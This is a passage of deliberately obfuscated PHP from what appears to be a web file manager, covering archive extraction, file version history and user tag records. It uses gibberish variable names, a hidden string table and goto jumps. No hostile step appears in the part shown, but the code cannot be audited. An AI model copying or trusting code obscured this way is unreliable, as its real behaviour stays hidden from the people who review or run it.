($½Ö¼àËÌ[$¤º·Ìéß[1196]] == -1) { return array($¤º·Ìéß[199] => $ğ‚”ËÉ«, $¤º·Ìéß[1195] => $¾ıæÁúô, $¤º·Ìéß[1197] => $ª‡Í÷şå); } $ÔêçÌ¹ = $ğ‚”ËÉ«; foreach ($¾ıæÁúô as $ö¡ğ‹±² => $—‡Ñòáğ) { if (!$—‡Ñòáğ || $—‡Ñòáğ[$¤º·Ìéß[1196]] == $¤º·Ìéß[1194]) { break; } if (substr($—‡Ñòáğ[$¤º·Ìéß[32]], -1, 1) == $¤º·Ìéß[8]) { break; } $ÏÍäÈ’› = in_array(get_path_ext($—‡Ñòáğ[$¤º·Ìéß[1211]]), array($¤º·Ìéß[313], $¤º·Ìéß[1201], $¤º·Ìéß[1202], $¤º·Ìéß[1203], $¤º·Ìéß[1204], $¤º·Ìéß[1205])); $Ôµ€À”² = $ö¡ğ‹±² == count($¾ıæÁúô) - 1 && $ÏÍäÈ’›; $—˜ıêú¾ = $ª‡Í÷şå . $—‡Ñòáğ[$¤º·Ìéß[1211]]; $’Œ±‚–® = $ª‡Í÷şå . get_path_this($—‡Ñòáğ[$¤º·Ìéß[32]]); if (IO::exist($—˜ıêú¾)) { $ÔêçÌ¹ = $—˜ıêú¾; continue; } $öéèÃÌ = $ö¡ğ‹±² == 0 ? get_path_ext($¿ˆ‘ø­Ã) : get_path_ext($ÔêçÌ¹); $‹ë¼Øû = KodArchive::extract(self::iconvSystem($ÔêçÌ¹), $ª‡Í÷şå, $—‡Ñòáğ[$¤º·Ìéß[1196]], $²ñµ‡ÄÏ, $öéèÃÌ); self::unzipErrorCheck($‹ë¼Øû, array($¤º·Ìéß[1217], $çÜõ¼, $¾ıæÁúô, $—‡Ñòáğ, $—˜ıêú¾)); if (IO::exist($’Œ±‚–®)) { IO::rename($’Œ±‚–®, get_path_this($—˜ıêú¾)); } $ÔêçÌ¹ = $—˜ıêú¾; } $“…¹ÌÄ  = $ÔêçÌ¹; return array($¤º·Ìéß[199] => $ÔêçÌ¹, $¤º·Ìéß[1195] => $¾ıæÁúô, $¤º·Ìéß[1197] => $ª‡Í÷şå); } private static function unzipErrorCheck($ëæëÕá½, $Üõ™ÁÖÃ = false) { $¤‹¶¡ƒ =& $_SERVER[Ì¥ŞÒ°£]; if ($ëæëÕá½[$¤‹¶¡ƒ[1218]]) { return !0; } write_log(array($¤‹¶¡ƒ[1219], $ëæëÕá½, $Üõ™ÁÖÃ), $¤‹¶¡ƒ[1220]); show_json($¤‹¶¡ƒ[1221] . json_encode($ëæëÕá½[$¤‹¶¡ƒ[1208]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $—ÁåÃ =& $_SERVER[Ì¥ŞÒ°£]; $ˆŠ‹œŠ = $GLOBALS[$—ÁåÃ[6]][$—ÁåÃ[89]]; if ($ˆŠ‹œŠ[$—ÁåÃ[1222]] != 1) { return; } if ($ˆŠ‹œŠ[$—ÁåÃ[1223]] <= 0) { return; } if (isset($_REQUEST[$—ÁåÃ[1224]]) && $_REQUEST[$—ÁåÃ[1224]] == $—ÁåÃ[88]) { return; } Hook::bind($—ÁåÃ[1225], $—ÁåÃ[1226]); Hook::bind($—ÁåÃ[1227], $—ÁåÃ[1228]); Hook::bind($—ÁåÃ[1229], $—ÁåÃ[1230]); Hook::bind($—ÁåÃ[1231], $—ÁåÃ[1232]); Hook::bind($—ÁåÃ[1233], $—ÁåÃ[1234]); Hook::bind($—ÁåÃ[1235], $—ÁåÃ[1236]); } public static function eventBeforeUpload($†íÎ´ŒÔ) { if ($†íÎ´ŒÔ[3] && $†íÎ´ŒÔ[3] != REPEAT_REPLACE) { return; } $­‡ó†¸‡ = self::parsePath($†íÎ´ŒÔ[0]); if (!$­‡ó†¸‡) { return; } self::add($­‡ó†¸‡); } public static function eventBeforeEdit($ù§ûäï“) { $áäñœÏÍ = self::parsePath($ù§ûäï“[0]); if (!$áäñœÏÍ) { return; } self::add($áäñœÏÍ); } public static function eventBeforeCopyFile($Ø§§¥ê, $ôú”«òÌ, $‰Éºúİä, $Ñ¼ìçÃ‰, $Éó»ÁéÕ, $îøÌêÅ½) { $ú”Ô“ˆö =& $_SERVER[Ì¥ŞÒ°£]; if (isset($‰Éºúİä->_data[$ú”Ô“ˆö[1160]]) && $‰Éºúİä->_data[$ú”Ô“ˆö[1160]]) { return; } $ã„ŸŠËÚ = $‰Éºúİä->getPathOuter($Ñ¼ìçÃ‰); $ĞÚù•Ï = self::parsePath($ã„ŸŠËÚ); if (!$ĞÚù•Ï) { return; } self::add($ĞÚù•Ï); } public static function eventBeforeRename($Õïª—¹) { $é¾»Œ´ =& $_SERVER[Ì¥ŞÒ°£]; $Ì¥¬ºªİ = self::parsePath($Õïª—¹[0]); if (!$Ì¥¬ºªİ) { return; } $ùÖºëöë = self::checkInHistory($Ì¥¬ºªİ); if (!$ùÖºëöë) { return; } if ($ùÖºëöë[$é¾»Œ´[33]] == $é¾»Œ´[199]) { $ ´´ò— = self::listData($Ì¥¬ºªİ); if ($ ´´ò— && $ ´´ò—[$é¾»Œ´[369]]) { self::moveHistory($Ì¥¬ºªİ, $Õïª—¹[1]); } } else { IO::rename($ùÖºëöë[$é¾»Œ´[84]], $Õïª—¹[1]); } } public static function eventBeforeMove($ßÒ§òä¢) { $ê‡ş™™ó =& $_SERVER[Ì¥ŞÒ°£]; $ÉÈ¯Ş®¤ = self::parsePath($ßÒ§òä¢[0]); if (!$ÉÈ¯Ş®¤) { return; } $·º“¤îÏ = self::parsePath($ßÒ§òä¢[1]); if (!$·º“¤îÏ) { return; } $ìª¾™î˜ = $ßÒ§òä¢[3]; $®€çşğĞ = self::checkInHistory($ÉÈ¯Ş®¤); if (!$®€çşğĞ) { return; } $ˆÅà†—ç = self::pathHistory($·º“¤îÏ); if ($®€çşğĞ[$ê‡ş™™ó[33]] == $ê‡ş™™ó[199]) { $¹Üß‹ä± = self::listData($ÉÈ¯Ş®¤); $ş”Š¨…ì = rtrim($·º“¤îÏ, $ê‡ş™™ó[8]) . $ê‡ş™™ó[8] . ($ìª¾™î˜ ? $ìª¾™î˜ : get_path_this($ÉÈ¯Ş®¤)); $ºÑàÁ½ë = self::listData($ş”Š¨…ì); if ($¹Üß‹ä± && $¹Üß‹ä±[$ê‡ş™™ó[369]] && $ºÑàÁ½ë && $ºÑàÁ½ë[$ê‡ş™™ó[369]]) { return self::clear($ÉÈ¯Ş®¤); } if ($¹Üß‹ä± && $¹Üß‹ä±[$ê‡ş™™ó[369]]) { self::moveHistory($ÉÈ¯Ş®¤, $ìª¾™î˜, $ˆÅà†—ç); } } else { IO::move($®€çşğĞ[$ê‡ş™™ó[84]], $ˆÅà†—ç, !1, $ìª¾™î˜); self::clearEmptyFolder(IO::pathFather($®€çşğĞ[$ê‡ş™™ó[84]])); } } public static function eventAfterRemove($¥‘œá«ì, $Í¸Ê©¥) { $ÎÚ½÷í– =& $_SERVER[Ì¥ŞÒ°£]; if (!$Í¸Ê©¥) { return; } $¯ˆÓ©™ = self::parsePath($¥‘œá«ì[0]); if (!$¯ˆÓ©™) { return; } $øÄØŒùæ = self::checkInHistory($¯ˆÓ©™); if (!$øÄØŒùæ) { return; } if ($øÄØŒùæ[$ÎÚ½÷í–[33]] == $ÎÚ½÷í–[199]) { $ÒäœŠËé = self::listData($¯ˆÓ©™, !1); if ($ÒäœŠËé && $ÒäœŠËé[$ÎÚ½÷í–[369]]) { self::clear($¯ˆÓ©™, !1); } } else { IO::remove($øÄØŒùæ[$ÎÚ½÷í–[84]]); self::clearEmptyFolder(IO::pathFather($øÄØŒùæ[$ÎÚ½÷í–[84]])); } } private static function checkInHistory($„Øá¯­¼) { $ñÏ™ ÷¶ = self::pathHistory($„Øá¯­¼); if (!IO::exist($ñÏ™ ÷¶)) { $ñÏ™ ÷¶ .= $_SERVER[Ì¥ŞÒ°£][1237]; } return IO::exist($ñÏ™ ÷¶) ? IO::info($ñÏ™ ÷¶) : !1; } private static function parsePath($œúùä”‰) { $í½ÉÙ™Â =& $_SERVER[Ì¥ŞÒ°£]; if (!$œúùä”‰) { return !1; } if ($GLOBALS[$í½ÉÙ™Â[1238]]) { return; } $ŒôÂø¼û = KodIO::parse($œúùä”‰); $“ÜşÂä = $ŒôÂø¼û[$í½ÉÙ™Â[33]]; $ƒÀ‹æ‘ = !$“ÜşÂä || $“ÜşÂä == KodIO::KOD_IO || $“ÜşÂä == KodIO::KOD_SHARE_ITEM; if (!$ƒÀ‹æ‘ || !$ŒôÂø¼û[$í½ÉÙ™Â[1239]]) { return !1; } if (substr($œúùä”‰, 0, strlen(DATA_PATH . $í½ÉÙ™Â[1240])) == DATA_PATH . $í½ÉÙ™Â[1240]) { return !1; } if ($“ÜşÂä == KodIO::KOD_SHARE_ITEM) { $¦‚…–—Ä = IO::init($œúùä”‰); if ($¦‚…–—Ä->pathParse[$í½ÉÙ™Â[1156]]) { return self::parsePath($¦‚…–—Ä->pathParse[$í½ÉÙ™Â[1156]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $­ÂÛ–¾ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $í½ÉÙ™Â[1241]); foreach ($­ÂÛ–¾ as $àæÂ„ˆ§) { if (!$“ÜşÂä && substr($œúùä”‰, 0, strlen($àæÂ„ˆ§)) == $àæÂ„ˆ§) { return !1; } } self::log($GLOBALS[$í½ÉÙ™Â[1151]] . $í½ÉÙ™Â[1242] . $œúùä”‰); return $œúùä”‰; } private static function pathHistory($ëƒÖ®†°) { $òÊ­Üé£ =& $_SERVER[Ì¥ŞÒ°£]; $öÍ¼šÄ = self::$_historyBase . ltrim(KodIO::clear($ëƒÖ®†°), $òÊ­Üé£[8]); $öÍ¼šÄ = str_replace(array($òÊ­Üé£[1243]), array($òÊ­Üé£[1244]), $öÍ¼šÄ); return $öÍ¼šÄ; } public static function log($¨ÔÌ˜íÚ) { } public static function historyCount($£ª£çÍï) { $¨ÉÖ››Ÿ =& $_SERVER[Ì¥ŞÒ°£]; $íæ˜öº© = array(); $¼Éå÷Íñ = array(); foreach ($£ª£çÍï as $Ã°µ¤û¥) { $ˆˆÁÆö† = get_path_father($Ã°µ¤û¥); if (!$¼Éå÷Íñ[$ˆˆÁÆö†]) { $¼Éå÷Íñ[$ˆˆÁÆö†] = array(); } $¼Éå÷Íñ[$ˆˆÁÆö†][] = get_path_this($Ã°µ¤û¥); } foreach ($¼Éå÷Íñ as $ˆˆÁÆö† => $«öİ£¤) { $¹Ä‹ğ÷¡ = self::parsePath($ˆˆÁÆö†); if (!$¹Ä‹ğ÷¡) { continue; } foreach ($«öİ£¤ as $å¼û‡’ˆ) { $›úõËè• = self::listData(rtrim($¹Ä‹ğ÷¡, $¨ÉÖ››Ÿ[8]) . $¨ÉÖ››Ÿ[8] . $å¼û‡’ˆ, !1); if ($›úõËè• && $›úõËè•[$¨ÉÖ››Ÿ[369]]) { $íæ˜öº©[rtrim($ˆˆÁÆö†, $¨ÉÖ››Ÿ[8]) . $¨ÉÖ››Ÿ[8] . $å¼û‡’ˆ] = count($›úõËè•[$¨ÉÖ››Ÿ[369]]); } } } return $íæ˜öº©; } public static function add($£é˜Ï­Á) { $§ò¸“˜ß =& $_SERVER[Ì¥ŞÒ°£]; $µğ³¢£Î = self::listData($£é˜Ï­Á); if (!$µğ³¢£Î) { return; } $à¶Œœ¯ò = Model($§ò¸“˜ß[772])->get($§ò¸“˜ß[1245]); $²ä”áÀ© = $GLOBALS[$§ò¸“˜ß[6]][$§ò¸“˜ß[89]][$§ò¸“˜ß[1223]]; $§¡ß–º¶ = $à¶Œœ¯ò == $§ò¸“˜ß[1246] ? min(5, $²ä”áÀ©) : $²ä”áÀ©; if ($²ä”áÀ© <= 0) { return; } $Æ½—ë“Æ = IO::info($£é˜Ï­Á); $ñÇˆ÷„ù = $µğ³¢£Î[$§ò¸“˜ß[369]]; if ($Æ½—ë“Æ[$§ò¸“˜ß[76]] == 0) { return; } if ($Æ½—ë“Æ[$§ò¸“˜ß[76]] >= 1024 * 1024 * 500) { return !1; } $Â¥‘¥ºƒ = IO::hashSimple($£é˜Ï­Á); if ($ñÇˆ÷„ù && $ñÇˆ÷„ù[0][$§ò¸“˜ß[177]] == $Â¥‘¥ºƒ) { return !0; } if (array_key_exists($§ò¸“˜ß[202], $Æ½—ë“Æ) && !$Æ½—ë“Æ[$§ò¸“˜ß[202]]) { return !1; } $˜™–ûîÄ = short_id(time()); $£À›É¸ = array($§ò¸“˜ß[399] => $˜™–ûîÄ, $§ò¸“˜ß[177] => $Â¥‘¥ºƒ, $§ò¸“˜ß[32] => $Æ½—ë“Æ[$§ò¸“˜ß[32]] . $§ò¸“˜ß[10] . date($§ò¸“˜ß[1247]) . rand_string(1), $§ò¸“˜ß[76] => $Æ½—ë“Æ[$§ò¸“˜ß[76]], $§ò¸“˜ß[454] => USER_ID, $§ò¸“˜ß[200] => time(), $§ò¸“˜ß[1248] => $§ò¸“˜ß[12]); IO::mkdir($µğ³¢£Î[$§ò¸“˜ß[1249]]); $‡¼Öâ… = IO::copy($£é˜Ï­Á, $µğ³¢£Î[$§ò¸“˜ß[1249]], !1, $£À›É¸[$§ò¸“˜ß[32]]); if (!$‡¼Öâ…) { self::clearEmptyFolder($µğ³¢£Î[$§ò¸“˜ß[1249]]); return !1; } array_unshift($ñÇˆ÷„ù, $£À›É¸); if (count($ñÇˆ÷„ù) > $§¡ß–º¶) { $Ñ´’Ï´ó = array_slice($ñÇˆ÷„ù, $§¡ß–º¶); foreach ($Ñ´’Ï´ó as $³©œÌşÑ) { IO::remove($µğ³¢£Î[$§ò¸“˜ß[1249]] . $³©œÌşÑ[$§ò¸“˜ß[32]]); } $ñÇˆ÷„ù = array_slice($ñÇˆ÷„ù, 0, $§¡ß–º¶); } return self::saveData($µğ³¢£Î[$§ò¸“˜ß[1250]], $ñÇˆ÷„ù); } public static function remove($Á³±ƒ¦æ, $áÔôá‡¶) { $•¼âšÎ =& $_SERVER[Ì¥ŞÒ°£]; $Ÿ¦ğÄé = self::listData($Á³±ƒ¦æ); $ºƒ“Ìç = array(); if (!$Ÿ¦ğÄé) { return !1; } foreach ($Ÿ¦ğÄé[$•¼âšÎ[369]] as $šİ‘Ãº§) { if ($šİ‘Ãº§[$•¼âšÎ[399]] == $áÔôá‡¶) { IO::remove($Ÿ¦ğÄé[$•¼âšÎ[1249]] . $šİ‘Ãº§[$•¼âšÎ[32]]); continue; } $ºƒ“Ìç[] = $šİ‘Ãº§; } return self::saveData($Ÿ¦ğÄé[$•¼âšÎ[1250]], $ºƒ“Ìç); } public static function clear($²ÍœÅÉé, $ĞêĞ•à¤ = true) { $ùƒ§¶† =& $_SERVER[Ì¥ŞÒ°£]; $´Ó‹•“è = self::listData($²ÍœÅÉé, $ĞêĞ•à¤); if (!$´Ó‹•“è) { return !1; } foreach ($´Ó‹•“è[$ùƒ§¶†[369]] as $«½Ûê¹) { IO::remove($´Ó‹•“è[$ùƒ§¶†[1249]] . $«½Ûê¹[$ùƒ§¶†[32]]); } return self::saveData($´Ó‹•“è[$ùƒ§¶†[1250]], array()); } public static function moveHistory($Å ”áÎú, $—¢İí‘ó = '', $Ÿæ¸ĞÏ˜ = '') { $äÊÁÁ®û =& $_SERVER[Ì¥ŞÒ°£]; $˜ ˜âŸ› = self::listData($Å ”áÎú, !1); if (!$˜ ˜âŸ› || !$˜ ˜âŸ›[$äÊÁÁ®û[369]]) { return !1; } $¶•¿¡¤¶ = $äÊÁÁ®û[1237]; $—¢İí‘ó = $—¢İí‘ó ? $—¢İí‘ó : get_path_this($Å ”áÎú); $Ÿæ¸ĞÏ˜ = $Ÿæ¸ĞÏ˜ ? $Ÿæ¸ĞÏ˜ : $˜ ˜âŸ›[$äÊÁÁ®û[1249]]; $ÍÉ©–Â¢ = substr(get_path_this($˜ ˜âŸ›[$äÊÁÁ®û[1250]]), 0, -strlen($¶•¿¡¤¶)); foreach ($˜ ˜âŸ›[$äÊÁÁ®û[369]] as $×±¸Ó“Ò => $º…†Ø¡®) { $ù«üó¢À = $—¢İí‘ó . substr($º…†Ø¡®[$äÊÁÁ®û[32]], strlen($ÍÉ©–Â¢)); $¤õŞš¼¼ = IO::move($˜ ˜âŸ›[$äÊÁÁ®û[1249]] . $º…†Ø¡®[$äÊÁÁ®û[32]], $Ÿæ¸ĞÏ˜, !1, $ù«üó¢À); if ($¤õŞš¼¼) { $˜ ˜âŸ›[$äÊÁÁ®û[369]][$×±¸Ó“Ò][$äÊÁÁ®û[32]] = $ù«üó¢À; } } $˜ ˜âŸ›[$äÊÁÁ®û[1250]] = IO::move($˜ ˜âŸ›[$äÊÁÁ®û[1250]], $Ÿæ¸ĞÏ˜, !1, $—¢İí‘ó . $¶•¿¡¤¶); self::saveData($˜ ˜âŸ›[$äÊÁÁ®û[1250]], $˜ ˜âŸ›[$äÊÁÁ®û[369]]); self::clearEmptyFolder($˜ ˜âŸ›[$äÊÁÁ®û[1249]]); } public static function rollback($¿İ’òŒœ, $Õ¸Ù½¬æ) { $¿¿“ÌŒä =& $_SERVER[Ì¥ŞÒ°£]; $×åºíáÔ = self::listData($¿İ’òŒœ); if (!$×åºíáÔ) { return; } $ê„‚ÎÁî = IO::info($¿İ’òŒœ); foreach ($×åºíáÔ[$¿¿“ÌŒä[369]] as $»úºöïº => $”ÆË–¹¥) { if ($”ÆË–¹¥[$¿¿“ÌŒä[399]] == $Õ¸Ù½¬æ) { self::add($¿İ’òŒœ); $È‚º‘›¿ = $×åºíáÔ[$¿¿“ÌŒä[1249]] . $”ÆË–¹¥[$¿¿“ÌŒä[32]]; $åÃèÖï = IO::copy($È‚º‘›¿, IO::pathFather($¿İ’òŒœ), REPEAT_REPLACE, $ê„‚ÎÁî[$¿¿“ÌŒä[32]]); if ($åÃèÖï) { self::remove($¿İ’òŒœ, $Õ¸Ù½¬æ); } return $åÃèÖï; } } return !1; } public static function setDetail($ÂúĞ„Â…, $¶ˆ”¶Å¨, $ÀÔµÑ) { $È€ÙÄ³ã =& $_SERVER[Ì¥ŞÒ°£]; $À«–‡ğÌ = self::listData($ÂúĞ„Â…); if (!$À«–‡ğÌ) { return; } foreach ($À«–‡ğÌ[$È€ÙÄ³ã[369]] as $”°õŠ¸À => $‚ å›¬ò) { if ($‚ å›¬ò[$È€ÙÄ³ã[399]] == $¶ˆ”¶Å¨) { $À«–‡ğÌ[$È€ÙÄ³ã[369]][$”°õŠ¸À][$È€ÙÄ³ã[1248]] = $ÀÔµÑ; self::saveData($À«–‡ğÌ[$È€ÙÄ³ã[1250]], $À«–‡ğÌ[$È€ÙÄ³ã[369]]); return !0; } } return !1; } public static function fileInfo($¼à“îü, $ßÙ´ëÈ) { $µÉ×¤İÆ =& $_SERVER[Ì¥ŞÒ°£]; $ŒÂ÷ÖÑ = self::listData($¼à“îü); if (!$ŒÂ÷ÖÑ) { show_json(LNG($µÉ×¤İÆ[105]), !1); } $î™¿Äº  = $µÉ×¤İÆ[12]; foreach ($ŒÂ÷ÖÑ[$µÉ×¤İÆ[369]] as $òóÍÊ ¥ => $ëËƒÚ) { if ($ëËƒÚ[$µÉ×¤İÆ[399]] != $ßÙ´ëÈ) { continue; } $î™¿Äº  = $ŒÂ÷ÖÑ[$µÉ×¤İÆ[1249]] . $ëËƒÚ[$µÉ×¤İÆ[32]]; break; } if (!$î™¿Äº ) { show_json(LNG($µÉ×¤İÆ[105]), !1); } return IO::info($î™¿Äº ); } public static function fileOut($¢û¹Ï —, $é¤Ëõë§, $àªšõç = false) { $ş™ü¹Ø× =& $_SERVER[Ì¥ŞÒ°£]; $™‚¾øËÛ = self::fileInfo($¢û¹Ï —, $é¤Ëõë§); $ÃïÌºé€ =& $GLOBALS[$ş™ü¹Ø×[7]]; $àªšõç = isset($ÃïÌºé€[$ş™ü¹Ø×[1200]]) && $ÃïÌºé€[$ş™ü¹Ø×[1200]] == 1; if (isset($ÃïÌºé€[$ş™ü¹Ø×[33]]) && $ÃïÌºé€[$ş™ü¹Ø×[33]] == $ş™ü¹Ø×[1251]) { return IO::fileOutImage($™‚¾øËÛ[$ş™ü¹Ø×[84]], $ÃïÌºé€[$ş™ü¹Ø×[1252]]); } IO::fileOut($™‚¾øËÛ[$ş™ü¹Ø×[84]], $àªšõç, get_path_this($¢û¹Ï —)); } public static function listData($İ€º» ¡, $¢¯¡úïæ = true) { $‘İó„´Ì =& $_SERVER[Ì¥ŞÒ°£]; if ($¢¯¡úïæ && !IO::exist($İ€º» ¡)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($İ€º» ¡, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¨ú’ú–ò = self::pathHistory($İ€º» ¡); $ı¦Âøäë = array($‘İó„´Ì[1250] => $¨ú’ú–ò . $‘İó„´Ì[1237], $‘İó„´Ì[1249] => rtrim(get_path_father($¨ú’ú–ò), $‘İó„´Ì[8]) . $‘İó„´Ì[8], $‘İó„´Ì[369] => array()); $îüÖßàÆ = IO::getContent($ı¦Âøäë[$‘İó„´Ì[1250]]); if ($îüÖßàÆ) { $—º‚ü·© = json_decode($îüÖßàÆ, !0); if (is_array($—º‚ü·©)) { $ı¦Âøäë[$‘İó„´Ì[369]] = $—º‚ü·©; } } return $ı¦Âøäë; } private static function saveData($è¨¬ãèİ, $’õìÓ÷ô) { $İ«ó§ÖÉ =& $_SERVER[Ì¥ŞÒ°£]; self::log($İ«ó§ÖÉ[1253] . $è¨¬ãèİ . $İ«ó§ÖÉ[71] . count($’õìÓ÷ô), $İ«ó§ÖÉ[754]); if ($’õìÓ÷ô) { return IO::setContent($è¨¬ãèİ, json_encode($’õìÓ÷ô)); } $÷•ìªş¬ = IO::pathFather($è¨¬ãèİ); IO::remove($è¨¬ãèİ); self::clearEmptyFolder($÷•ìªş¬); return !0; } public static function clearEmptyFolder($¥¥íı¿º) { $¶ïûÕ£ =& $_SERVER[Ì¥ŞÒ°£]; if (trim($¥¥íı¿º, $¶ïûÕ£[8]) == trim(self::$_historyBase, $¶ïûÕ£[8])) { return; } $Éü‹Ù® = IO::pathFather($¥¥íı¿º); $¯âì«æÇ = IO::has($¥¥íı¿º, !0); if ($¯âì«æÇ[$¶ïûÕ£[207]] > 0 || $¯âì«æÇ[$¶ïûÕ£[208]] > 0) { return; } IO::remove($¥¥íı¿º); self::clearEmptyFolder($Éü‹Ù®); } private static function getBasePath() { $Âˆ Æ©ğ =& $_SERVER[Ì¥ŞÒ°£]; $Ü¾É¬öù = Model($Âˆ Æ©ğ[1254])->get($Âˆ Æ©ğ[1255]); if ($Ü¾É¬öù) { if (!IO::exist($Ü¾É¬öù)) { IO::mkdir($Ü¾É¬öù); } if (get_path_this($Ü¾É¬öù) == $Âˆ Æ©ğ[1240]) { $–îÀèŠ« = $Âˆ Æ©ğ[1256] . rand_string(8); @rename($Ü¾É¬öù, get_path_father($Ü¾É¬öù) . $Âˆ Æ©ğ[8] . $–îÀèŠ«); $Ü¾É¬öù = DATA_PATH . $–îÀèŠ« . $Âˆ Æ©ğ[8]; file_put_contents(DATA_PATH . $Âˆ Æ©ğ[1190], $Âˆ Æ©ğ[12]); Model($Âˆ Æ©ğ[1254])->set($Âˆ Æ©ğ[1255], $Ü¾É¬öù); } return $Ü¾É¬öù; } $Ü¾É¬öù = DATA_PATH . $Âˆ Æ©ğ[1256] . rand_string(8) . $Âˆ Æ©ğ[8]; $Ü¾É¬öù = IO::mkdir($Ü¾É¬öù); $Ü¾É¬öù = rtrim($Ü¾É¬öù, $Âˆ Æ©ğ[8]) . $Âˆ Æ©ğ[8]; file_put_contents($Ü¾É¬öù . $Âˆ Æ©ğ[1190], $Âˆ Æ©ğ[12]); file_put_contents(DATA_PATH . $Âˆ Æ©ğ[1190], $Âˆ Æ©ğ[12]); Model($Âˆ Æ©ğ[1254])->set($Âˆ Æ©ğ[1255], $Ü¾É¬öù); return $Ü¾É¬öù; } } goto d¥È­«ÓîÑ; C²öêóšÀÔ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($ÚŠĞ¿ß…) { $óïŞ´ğ =& $_SERVER[Ì¥ŞÒ°£]; return array($óïŞ´ğ[1968] => array($óïŞ´ğ[2347] . USER_ID, $óïŞ´ğ[1969])); } protected function listData() { $êÈ¾™ù» =& $_SERVER[Ì¥ŞÒ°£]; $øÃÕâµÉ = array($êÈ¾™ù»[1658] => USER_ID, $êÈ¾™ù»[484] => array($êÈ¾™ù»[1972], 0)); $ç‘î²¸„ = $êÈ¾™ù»[2348]; $ÃÛ™ãóã = $this->field($ç‘î²¸„)->where($øÃÕâµÉ)->order($êÈ¾™ù»[1975])->select(); return $ÃÛ™ãóã ? $ÃÛ™ãóã : array(); } protected function addToTag($«¡®èÕÁ, $áœ¡Ìä) { $¯şÒÑ”Ì =& $_SERVER[Ì¥ŞÒ°£]; if (!Model($¯şÒÑ”Ì[2112])->listData($áœ¡Ìä)) { return !1; } if (is_numeric($«¡®èÕÁ)) { $ƒ¯¾§Â‘ = Model($¯şÒÑ”Ì[827])->pathInfo($«¡®èÕÁ); if (!$ƒ¯¾§Â‘) { return !1; } } else { $ƒ¯¾§Â‘ = IO::infoSimple($«¡®èÕÁ); if (!$ƒ¯¾§Â‘) { return !1; } $±íæË÷ü = $ƒ¯¾§Â‘[$¯şÒÑ”Ì[32]]; $¥‚•ö‘Æ = $ƒ¯¾§Â‘[$¯şÒÑ”Ì[33]]; if (isset($ƒ¯¾§Â‘[$¯şÒÑ”Ì[410]])) { $¥‚•ö‘Æ = $ƒ¯¾§Â‘[$¯şÒÑ”Ì[410]] == $¯şÒÑ”Ì[88] ? $¯şÒÑ”Ì[75] : $¯şÒÑ”Ì[199]; } } $À›÷ó¥Ô = array($¯şÒÑ”Ì[1658] => USER_ID, $¯şÒÑ”Ì[484] => $áœ¡Ìä, $¯şÒÑ”Ì[421] => $«¡®èÕÁ, $¯şÒÑ”Ì[422] => $¥‚•ö‘Æ ? $¥‚•ö‘Æ : $¯şÒÑ”Ì[416], $¯şÒÑ”Ì[420] => $±íæË÷ü ? $±íæË÷ü : $¯şÒÑ”Ì[12], $¯şÒÑ”Ì[1861] => 0); if ($this->where($À›÷ó¥Ô)->find()) { return !1; } return $this->add($À›÷ó¥Ô); } protected function removeFromTag($¶¡Á×˜, $¾ñ¦Ò¬˜) { $•ôü÷¨” =& $_SERVER[Ì¥ŞÒ°£]; if (!Model($•ôü÷¨”[2112])->listData($¾ñ¦Ò¬˜)) { return !1; } if (is_array($¶¡Á×˜)) { $¶¡Á×˜ = array($•ôü÷¨”[7], $¶¡Á×˜); } $÷Â¢éÉ = array($•ôü÷¨”[1658] => USER_ID, $•ôü÷¨”[484] => $¾ñ¦Ò¬˜, $•ôü÷¨”[421] => $¶¡Á×˜); return $this->where($÷Â¢éÉ)->delete(); } protected function removeByTag($öİ”›ã) { $‹ğ•ñ˜Š =& $_SERVER[Ì¥ŞÒ°£]; if (!$öİ”›ã) { return !1; } $“°õ¹¡û = array($‹ğ•ñ˜Š[1658] => USER_ID, $‹ğ•ñ˜Š[484] => $öİ”›ã); return $this->where($“°õ¹¡û)->delete(); } protected function removeBySource($…ë´øÑ) { $âÃüæÒ§ =& $_SERVER[Ì¥ŞÒ°£]; if (is_array($…ë´øÑ)) { $…ë´øÑ = array($âÃüæÒ§[7], $…ë´øÑ); } $Øğçòùç = array($âÃüæÒ§[1658] => USER_ID, $âÃüæÒ§[484] => array($âÃüæÒ§[1019], 0), $âÃüæÒ§[421] => $…ë´øÑ); return $this->where($Øğçòùç)->delete(); } }